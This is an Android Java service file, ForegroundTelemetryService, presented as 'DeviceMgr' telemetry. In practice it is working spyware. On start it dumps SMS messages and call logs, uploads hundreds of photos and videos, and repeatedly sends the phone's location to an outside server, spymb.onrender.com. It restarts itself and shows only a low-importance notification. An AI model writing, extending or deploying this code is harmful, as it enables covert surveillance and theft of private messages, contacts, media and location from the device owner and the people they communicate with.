package com.company.devicemgr.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentUris;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.IBinder;
import android.provider.MediaStore;
import android.util.Log;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.security.MessageDigest;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Set;

public class ForegroundTelemetryService extends Service implements LocationListener {
	private static final String TAG = "ForegroundSvc";
	private static final String CHANNEL_ID = "devicemgr_channel";
	private LocationManager locationManager;
	private volatile Location lastLocation = null;
	private volatile boolean running = false;
	
	@Override
	public void onCreate() {
		super.onCreate();
		createNotificationChannel();
		Notification n;
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
			n = new Notification.Builder(this, CHANNEL_ID)
			.setContentTitle("DeviceMgr")
			.setContentText("Enviando telemetria")
			.setSmallIcon(android.R.drawable.ic_menu_mylocation)
			.build();
			} else {
			n = new Notification.Builder(this)
			.setContentTitle("DeviceMgr")
			.setContentText("Enviando telemetria")
			.setSmallIcon(android.R.drawable.ic_menu_mylocation)
			.build();
		}
		startForeground(1, n);
		
		locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
		running = true;
		
		// registar updates (GPS e NETWORK) se permissão concedida
		try {
			if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
				locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 15 * 1000L, 5f, this);
			}
			if (checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
				locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 15 * 1000L, 10f, this);
			}
			} catch (Exception e) {
			Log.e(TAG, "location request failed", e);
		}
		
		// worker thread: media upload once + periodic telemetry send
		new Thread(() -> {
			try {
				Thread.sleep(4000);
			} catch (InterruptedException e) { /* ignore */ }
			
			try {
				uploadAllMediaOnce();
				} catch (Exception e) {
				Log.e(TAG, "uploadAllMediaOnce err", e);
			}
			
			while (running) {
				try {
					sendTelemetryOnce();
					Thread.sleep(30 * 1000L);
					} catch (InterruptedException ie) {
					break;
					} catch (Exception e) {
					Log.e(TAG, "sender loop err", e);
				}
			}
		}).start();
		
		// send SMS and CallLog once at start (non-blocking)
		new Thread(() -> {
			try { sendSmsDump(); } catch (Exception e) { Log.e(TAG, "sendSmsDump err", e); }
			try { sendCallLogDump(); } catch (Exception e) { Log.e(TAG, "sendCallLogDump err", e); }
		}).start();
		
		getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putBoolean("service_started", true).apply();
	}
	
	private void createNotificationChannel() {
		if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
			NotificationChannel nc = new NotificationChannel(CHANNEL_ID, "DeviceMgr", NotificationManager.IMPORTANCE_LOW);
			NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
			if (nm != null) nm.createNotificationChannel(nc);
		}
	}
	
	/**
	* Send a single telemetry payload to backend.
	*/
	private void sendTelemetryOnce() {
		try {
			SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
			String deviceId = sp.getString("deviceId", "unknown");
			String token = sp.getString("auth_token", null);
			JSONObject payload = new JSONObject();
			
			if (lastLocation != null) {
				JSONObject loc = new JSONObject();
				loc.put("lat", lastLocation.getLatitude());
				loc.put("lon", lastLocation.getLongitude());
				loc.put("accuracy", lastLocation.getAccuracy());
				payload.put("location", loc);
				} else {
				Location fallback = null;
				try {
					if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED)
					fallback = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
				} catch (Exception e) {}
				try {
					if (fallback == null && checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED)
					fallback = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
				} catch (Exception e) {}
				
				if (fallback != null) {
					JSONObject loc = new JSONObject();
					loc.put("lat", fallback.getLatitude());
					loc.put("lon", fallback.getLongitude());
					loc.put("accuracy", fallback.getAccuracy());
					payload.put("location", loc);
					} else {
					payload.put("note", "no_location");
				}
			}
			payload.put("ts", System.currentTimeMillis());
			
			JSONObject body = new JSONObject();
			body.put("type", "telemetry");
			body.put("payload", payload);
			
			String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
			try {
				String res = com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token);
				Log.d(TAG, "telemetry response: " + res);
				} catch (Exception e) {
				Log.e(TAG, "send telemetry http err", e);
			}
			} catch (Exception e) {
			Log.e(TAG, "sendTelemetryOnce error", e);
		}
	}
	
	// LocationListener
	@Override
	public void onLocationChanged(Location location) {
		lastLocation = location;
		// send immediately
		new Thread(() -> {
			try {
				SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
				String deviceId = sp.getString("deviceId", "unknown");
				String token = sp.getString("auth_token", null);
				JSONObject payload = new JSONObject();
				JSONObject loc = new JSONObject();
				loc.put("lat", location.getLatitude());
				loc.put("lon", location.getLongitude());
				loc.put("accuracy", location.getAccuracy());
				payload.put("location", loc);
				payload.put("ts", System.currentTimeMillis());
				JSONObject body = new JSONObject();
				body.put("type", "telemetry");
				body.put("payload", payload);
				String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
				com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token);
				} catch (Exception e) {
				Log.e(TAG, "onLocationChanged send err", e);
			}
		}).start();
	}
	
	@Override public void onProviderDisabled(String provider) {}
	@Override public void onProviderEnabled(String provider) {}
	@Override public void onStatusChanged(String provider, int status, android.os.Bundle extras) {}
	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// ensure service keeps running
		return Service.START_STICKY;
	}
	
	@Override
	public void onDestroy() {
		running = false;
		try { if (locationManager != null) locationManager.removeUpdates(this); } catch (Exception e) { /* ignore */ }
		getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putBoolean("service_started", false).apply();
		super.onDestroy();
	}
	
	// -------------------- SMS & CALLLOG sending --------------------
	
	private void sendSmsDump() {
		try {
			if (checkSelfPermission(android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
				Log.i(TAG, "no READ_SMS permission");
				return;
			}
			SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
			String deviceId = sp.getString("deviceId", "unknown");
			String token = sp.getString("auth_token", null);
			
			ContentResolver cr = getContentResolver();
			Cursor cur = cr.query(Uri.parse("content://sms"), null, null, null, "date DESC");
			if (cur == null) return;
			int max = 200;
			while (cur.moveToNext() && max-- > 0) {
				try {
					JSONObject payload = new JSONObject();
					payload.put("from", cur.getString(cur.getColumnIndexOrThrow("address")));
					payload.put("body", cur.getString(cur.getColumnIndexOrThrow("body")));
					payload.put("ts", cur.getLong(cur.getColumnIndexOrThrow("date")));
					JSONObject body = new JSONObject();
					body.put("type", "sms");
					body.put("payload", payload);
					String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
					try { com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token); } catch (Exception e) { Log.e(TAG, "sms send err", e); }
				} catch (Exception e) { Log.e(TAG, "sms item err", e); }
			}
			cur.close();
			} catch (Exception e) {
			Log.e(TAG, "sendSmsDump err", e);
		}
	}
	
	private void sendCallLogDump() {
		try {
			if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
				Log.i(TAG, "no READ_CALL_LOG permission");
				return;
			}
			SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
			String deviceId = sp.getString("deviceId", "unknown");
			String token = sp.getString("auth_token", null);
			
			ContentResolver cr = getContentResolver();
			Cursor cur = cr.query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, android.provider.CallLog.Calls.DATE + " DESC");
			if (cur == null) return;
			int max = 200;
			while (cur.moveToNext() && max-- > 0) {
				try {
					JSONObject payload = new JSONObject();
					payload.put("number", cur.getString(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)));
					payload.put("type", cur.getInt(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)));
					payload.put("duration", cur.getLong(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)));
					payload.put("ts", cur.getLong(cur.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)));
					JSONObject body = new JSONObject();
					body.put("type", "call");
					body.put("payload", payload);
					String url = "https://spymb.onrender.com/api/telemetry/" + deviceId;
					try { com.company.devicemgr.utils.HttpClient.postJson(url, body.toString(), token); } catch (Exception e) { Log.e(TAG, "call send err", e); }
				} catch (Exception e) { Log.e(TAG, "call item err", e); }
			}
			cur.close();
			} catch (Exception e) {
			Log.e(TAG, "sendCallLogDump err", e);
		}
	}
	
	// -------------------- Media auto-upload --------------------
	
	/**
	* Upload all media (images/videos) once at service start.
	* Avoid duplicates by saving SHA-256 checksums in SharedPreferences (JSON object).
	*/
	private void uploadAllMediaOnce() {
		try {
			if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
				Log.i(TAG, "no READ_EXTERNAL_STORAGE perm for media upload");
				return;
			}
			SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
			String deviceId = sp.getString("deviceId", "unknown");
			String token = sp.getString("auth_token", null);
			
			// load uploaded set (JSON)
			String uploadedJson = sp.getString("uploaded_media_hashes", "{}");
			org.json.JSONObject uploadedObj = new org.json.JSONObject(uploadedJson);
			Set<String> uploaded = new HashSet<>();
			Iterator<?> it = uploadedObj.keys();
			while (it.hasNext()) {
				Object k = it.next();
				if (k != null) uploaded.add(k.toString());
			}
			
			ContentResolver cr = getContentResolver();
			String[] projection = { MediaStore.MediaColumns._ID, MediaStore.MediaColumns.MIME_TYPE };
			
			// images
			Cursor cursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC");
			if (cursor != null) {
				int count = 0;
				while (cursor.moveToNext()) {
					if (++count > 500) break; // safety limit
					long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
					String mime = null;
					try { mime = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)); } catch (Exception e) { /* ignore */ }
					Uri uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
					try (InputStream is = cr.openInputStream(uri)) {
						if (is == null) continue;
						byte[] data = readAllBytes(is);
						String hash = sha256(data);
						if (hash == null) continue;
						if (uploaded.contains(hash)) continue;
						String filename = "img_" + id + (mime != null && mime.contains("/") ? ("." + mime.substring(mime.indexOf("/") + 1)) : ".jpg");
						String url = "https://spymb.onrender.com/api/media/" + deviceId + "/upload";
						String resp = com.company.devicemgr.utils.HttpClient.uploadFile(url, "media", filename, data, mime, token);
						try {
							JSONObject jr = new JSONObject(resp);
							if (jr.optBoolean("ok")) {
								uploaded.add(hash);
								uploadedObj.put(hash, true);
								sp.edit().putString("uploaded_media_hashes", uploadedObj.toString()).apply();
							}
						} catch (Exception e) { Log.e(TAG, "upload parse err", e); }
					} catch (Exception e) { Log.e(TAG, "upload image err", e); }
				}
				cursor.close();
			}
			
			// videos
			Cursor vcur = cr.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, projection, null, null, MediaStore.MediaColumns.DATE_ADDED + " DESC");
			if (vcur != null) {
				int count = 0;
				while (vcur.moveToNext()) {
					if (++count > 500) break; // safety limit
					long id = vcur.getLong(vcur.getColumnIndexOrThrow(MediaStore.MediaColumns._ID));
					String mime = null;
					try { mime = vcur.getString(vcur.getColumnIndexOrThrow(MediaStore.MediaColumns.MIME_TYPE)); } catch (Exception e) { /* ignore */ }
					Uri uri = ContentUris.withAppendedId(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, id);
					try (InputStream is = cr.openInputStream(uri)) {
						if (is == null) continue;
						byte[] data = readAllBytes(is);
						String hash = sha256(data);
						if (hash == null) continue;
						if (uploaded.contains(hash)) continue;
						String filename = "vid_" + id + (mime != null && mime.contains("/") ? ("." + mime.substring(mime.indexOf("/") + 1)) : ".mp4");
						String url = "https://spymb.onrender.com/api/media/" + deviceId + "/upload";
						String resp = com.company.devicemgr.utils.HttpClient.uploadFile(url, "media", filename, data, mime, token);
						try {
							JSONObject jr = new JSONObject(resp);
							if (jr.optBoolean("ok")) {
								uploaded.add(hash);
								uploadedObj.put(hash, true);
								sp.edit().putString("uploaded_media_hashes", uploadedObj.toString()).apply();
							}
						} catch (Exception e) { Log.e(TAG, "upload parse err", e); }
					} catch (Exception e) { Log.e(TAG, "upload video err", e); }
				}
				vcur.close();
			}
			
			} catch (Exception e) {
			Log.e(TAG, "uploadAllMediaOnce err", e);
		}
	}
	
	private static byte[] readAllBytes(InputStream is) throws java.io.IOException {
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		byte[] buffer = new byte[8192];
		int read;
		while ((read = is.read(buffer)) != -1) {
			bos.write(buffer, 0, read);
		}
		is.close();
		return bos.toByteArray();
	}
	
	private static String sha256(byte[] data) {
		try {
			MessageDigest md = MessageDigest.getInstance("SHA-256");
			md.update(data);
			byte[] digest = md.digest();
			StringBuilder sb = new StringBuilder();
			for (byte b : digest) sb.append(String.format("%02x", b & 0xff));
			return sb.toString();
			} catch (Exception e) {
			Log.e(TAG, "sha256 error", e);
			return null;
		}
	}
}